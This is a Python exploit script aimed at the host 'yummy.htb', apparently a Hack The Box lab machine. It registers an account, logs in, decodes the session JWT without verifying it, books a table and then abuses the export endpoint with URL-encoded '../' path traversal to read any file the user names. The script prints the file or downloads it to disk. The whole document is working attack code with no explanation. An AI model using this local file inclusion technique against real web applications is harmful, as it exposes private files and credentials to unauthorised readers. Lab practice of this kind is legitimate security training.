#!/usr/bin/python3
import requests, jwt, sys, shutil, argparse, urllib.parse
from bs4 import BeautifulSoup
from tqdm import tqdm

email = 'test@example.de'
password = 'test'
d_name = 'name'
d_email = email
d_phone = '00000000000'
d_date = '2024-10-05'
d_time = '00:00'
d_people = '1'
d_message = 'msg'
s = requests.Session()

def register():
    headers = {
        'Content-Type': 'application/json'
    }
    json_data = {
        'email': email,
        'password': password,
    }
    r = requests.post('http://yummy.htb/register', headers=headers, json=json_data, verify=False)

def login():
    headers = {
        'Content-Type': 'application/json',
    }
    json_data = {
        'email': email,
        'password': password,
    }
    r = s.post('http://yummy.htb/login', headers=headers, json=json_data, verify=False)
    if args.cookie:
        jwt_cookie = r.cookies.get('X-AUTH-Token')
        decoded = jwt.decode(jwt_cookie, options={"verify_signature": False})
        print(decoded)

def book_a_table():
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = {
        'name': d_name,
        'email': d_email,
        'phone': d_phone,
        'date': d_date,
        'time': d_time,
        'people': d_people,
        'message': d_message,
    }
    r = s.post('http://yummy.htb/book', headers=headers, data=data, verify=False)

def dashboard():
    r = s.get('http://yummy.htb/dashboard')
    soup = BeautifulSoup(r.content, 'html5lib')
    td = soup.find_all('td')
    id_ = td[0].text
    email_ = td[1].text
    date_ = td[2].text
    time_ = td[3].text
    message_ = td[4].text
    people_ = td[5].text
    reminder(id_)  
    lfi() 
    delete(id_)

def delete(id):
    r = s.get(f'http://yummy.htb/delete/{id}')

def reminder(id): 
    r = s.get(f'http://yummy.htb/reminder/{id}', allow_redirects=False)

def lfi():
    path = urllib.parse.quote(f'../..{args.file}', safe='')
    if not args.output:
        r = s.get(f'http://yummy.htb/export/{path}', verify=False)
        print(r.text)
    else:
        r = s.get(f'http://yummy.htb/export/{path}', stream=True)
        total_size = int(r.headers.get('content-length', 0))
        block_size = 1024  

        with open(args.output, 'wb') as out_file, tqdm(desc="Downloading 0.0 ", total=total_size, unit='B', unit_scale=True, unit_divisor=1024) as bar:
            for data in r.iter_content(block_size):
                out_file.write(data)
                bar.update(len(data))
        del r
        print(f'File has been saved at: {args.output}')

parser = argparse.ArgumentParser(description='Automation script for the Local File Inclusion (LFI)')
parser.add_argument('-f', '--file', type=str, required=True, help='File to read')
parser.add_argument('-o', '--output', type=str, help='Output file name')
parser.add_argument('-c', '--cookie', action=argparse.BooleanOptionalAction, help='Show your JWT cookie')
args = parser.parse_args()

register()
login()
book_a_table()
dashboard()
